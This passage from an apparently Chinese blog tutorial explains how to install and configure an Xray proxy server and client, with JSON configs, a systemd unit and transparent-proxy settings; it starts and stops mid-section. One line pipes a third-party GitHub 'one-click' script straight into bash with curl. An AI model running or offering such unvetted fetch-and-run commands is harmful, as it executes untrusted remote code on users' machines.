shadowsocks-libev-local@.service</span><br></pre></td></tr></table></figure><h3 id="2-xray"><a href="#2-xray" class="headerlink" title="2.xray"></a>2.xray</h3><h4 id="2-1-xray服务端配置"><a href="#2-1-xray服务端配置" class="headerlink" title="2.1 xray服务端配置"></a>2.1 xray服务端配置</h4><p>1.获取Xray内核，这里直接从github下载二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/XTLS/Xray-core/releases/download/v1.7.5/Xray-linux-64.zip</span><br><span class="line"><span class="comment">#一键安装脚本</span></span><br><span class="line">bash &lt;(curl -Ls https://raw.githubusercontent.com/daveleung/hijkpw-scripts-mod/main/xray_mod1.sh)</span><br></pre></td></tr></table></figure><p>2.解压文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/xray</span><br><span class="line">sudo unzip Xray-linux-64.zip -d /usr/local/xray <span class="comment">#将v2ray压缩包指定解压到v2ray目录下</span></span><br></pre></td></tr></table></figure><p>解压完一会得到几个文件</p><ul><li>xray               xray的核心文件</li><li>geosite.dat   用于流量分流的域名规则</li><li>geoip.dat     用于流量分流的ip规则</li><li>readme.md  说明文档</li></ul><p>3.创建服务端配置文件<br>基于vless+kcp传输协议</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /etc/xray</span><br><span class="line">sudo vim /etc/xray/config.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;access&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/log/xray/access.log&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/log/xray/error.log&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loglevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;info&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">443</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vless&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;63a1897b-895d-4307-ae9f-558cf04d4138&quot;</span> <span class="comment">//表示符用于客户端验证</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;decryption&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;fallbacks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="number">80</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;streamSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;network&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tls&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tlsSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;certificates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              <span class="attr">&quot;certificateFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/local/xray/cert/ssl.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="attr">&quot;keyFile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/local/xray/cert/ssl.key&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">          <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tcpSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kcpSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;mtu&quot;</span><span class="punctuation">:</span> <span class="number">1350</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;tti&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;uplinkCapacity&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;downlinkCapacity&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;congestion&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;readBufferSize&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeBufferSize&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;header&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wechat-video&quot;</span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;seed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9yPvIsO0&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;wsSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;quicSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;domain&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v.tbctl.cn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;freedom&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blackhole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;block&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;routing&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;field&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;0.0.0.0/8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;10.0.0.0/8&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;100.64.0.0/10&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;169.254.0.0/16&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;172.16.0.0/12&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;192.0.0.0/24&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;192.0.2.0/24&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;192.168.0.0/16&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;198.18.0.0/15&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;198.51.100.0/24&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;203.0.113.0/24&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;::1/128&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;fc00::/7&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;fe80::/10&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;block&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>4.创建service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /usr/lib/systemd/system/xray.service</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Xray Service</span><br><span class="line">Documentation=https://github.com/xtls</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE</span><br><span class="line">NoNewPrivileges=<span class="literal">true</span></span><br><span class="line">ExecStart=/usr/local/xray/xray run -config /etc/xray/config.json</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重载文件</span></span><br><span class="line">systemd daemon-reload</span><br></pre></td></tr></table></figure><p>4.启动xray服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start xray.service</span><br></pre></td></tr></table></figure><h4 id="2-2-xray客户端"><a href="#2-2-xray客户端" class="headerlink" title="2.2 xray客户端"></a>2.2 xray客户端</h4><h6 id="1-获取Xray内核"><a href="#1-获取Xray内核" class="headerlink" title="1.获取Xray内核"></a>1.获取Xray内核</h6><p>这里直接从github下载二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/XTLS/Xray-core/releases/download/v1.7.5/Xray-linux-64.zip</span><br></pre></td></tr></table></figure><h6 id="2-解压文件"><a href="#2-解压文件" class="headerlink" title="2.解压文件"></a>2.解压文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/xray</span><br><span class="line">sudo unzip Xray-linux-64.zip -d /usr/local/xray <span class="comment">#将v2ray压缩包指定解压到v2ray目录下</span></span><br></pre></td></tr></table></figure><h6 id="3-配置客户端配置文件"><a href="#3-配置客户端配置文件" class="headerlink" title="3.配置客户端配置文件"></a>3.配置客户端配置文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etx/xray/config.json</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;log&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="comment">//日志</span></span><br><span class="line">    <span class="attr">&quot;loglevel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/log/xray/error.log&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;access&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/var/log/xray/access.log&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;all-in&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">12345</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dokodemo-door&quot;</span><span class="punctuation">,</span> <span class="comment">//用于透明代理，这里默认监听到0.0.0.0，不能监听到127.0.0.1，如果监听到127.0.0.1会导致透明代理失败，对于端口对外暴漏的问题可以通过设置防火墙规则来实现</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;network&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tcp,udp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;followRedirect&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sniffing&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;destOverride&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;http&quot;</span><span class="punctuation">,</span> <span class="string">&quot;tls&quot;</span><span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;streamSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sockopt&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;tproxy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tproxy&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;socks&quot;</span><span class="punctuation">,</span> <span class="comment">//如果需要socks代理可以设置这一段，注意，socks代理端口不能对外暴露，尤其是在云服务器上，</span></span><br><span class="line">      <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;listen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span> <span class="comment">//这里一定要监听到本地</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;socks&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sniffing&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;destOverride&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;http&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;tls&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;routeOnly&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;noauth&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;udp&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;allowTransparent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;direct&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;freedom&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;domainStrategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UseIPv4&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;streamSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sockopt&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;mark&quot;</span><span class="punctuation">:</span> <span class="number">2</span> <span class="comment">//用于tproxy对流量进行分类，防止流量回环，这个值要和后面的iptables的配置值对应。</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;proxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vless&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;vnext&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v.tbctl.cn&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">443</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;users&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;63a1897b-895d-4307-ae9f-558cf111111&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;alterId&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;t@t.tt&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;encryption&quot;</span><span class="punctuation">:</span> <span class="string">&quot;none&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;flow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;streamSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;network&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kcp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;security&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tls&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tlsSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;allowInsecure&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;show&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kcpSettings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;mtu&quot;</span><span 